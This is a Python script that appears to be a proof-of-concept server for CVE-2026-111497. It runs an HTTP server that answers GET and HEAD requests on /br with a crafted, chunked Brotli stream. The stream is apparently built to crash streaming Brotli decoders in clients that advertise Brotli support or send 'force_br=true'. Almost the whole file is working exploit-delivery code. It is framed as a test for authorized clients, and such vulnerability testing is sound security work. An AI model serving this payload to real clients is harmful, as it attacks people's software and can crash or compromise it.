#!/usr/bin/env python3
"""Serve a Brotli crash test response to an authorized test client."""

import argparse
import struct
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlsplit


# CVE-2026-111497 test stream, sent in two chunks to exercise streaming clients.
FIRST = (
    bytes.fromhex("21feffff1341e4ffff7f030440081282042e")
    + bytes.fromhex("0210800004200001084000") * (1 << 21)
    + b"\0" * 3
)
SECOND = b"\0" * 7 + b"\x08" + b"\0" * 7 + struct.pack(
    "<iII", 0x7FFFFFFF, 0x7FFFFFFF, 0x7FFFFFFF
) + b"\0" * 100


def accepts_brotli(headers):
    for header in headers.get_all("Accept-Encoding", []):
        for encoding in header.split(","):
            name, *parameters = encoding.split(";")
            if name.strip().lower() != "br":
                continue
            try:
                quality = next(
                    (float(value.strip()) for parameter in parameters
                     if "=" in parameter
                     for key, value in [parameter.split("=", 1)]
                     if key.strip().lower() == "q"),
                    1.0,
                )
            except ValueError:
                continue
            if 0 < quality <= 1:
                return True
    return False


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def setup(self):
        super().setup()
        self.connection.settimeout(10)

    def do_GET(self):
        target = urlsplit(self.path)
        if not target.path.startswith("/br"):
            self.send_error(404)
            return
        forced = "force_br=true" in target.query.split("&")
        if not forced and not accepts_brotli(self.headers):
            self.send_error(406, "Client did not advertise Brotli support")
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Encoding", "br")
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Connection", "close")
        self.end_headers()
        self.close_connection = True
        if self.command == "HEAD":
            return

        try:
            for stage in (FIRST, SECOND):
                self.wfile.write(f"{len(stage):x}\r\n".encode())
                self.wfile.write(stage)
                self.wfile.write(b"\r\n")
                self.wfile.flush()
                if stage is FIRST:
                    time.sleep(0.1)
            self.wfile.write(b"0\r\n\r\n")
        except (BrokenPipeError, ConnectionResetError, TimeoutError):
            pass

    do_HEAD = do_GET


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=3000)
    args = parser.parse_args()
    with HTTPServer((args.host, args.port), Handler) as server:
        print(f"Listening on http://{args.host}:{server.server_port}/br", flush=True)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
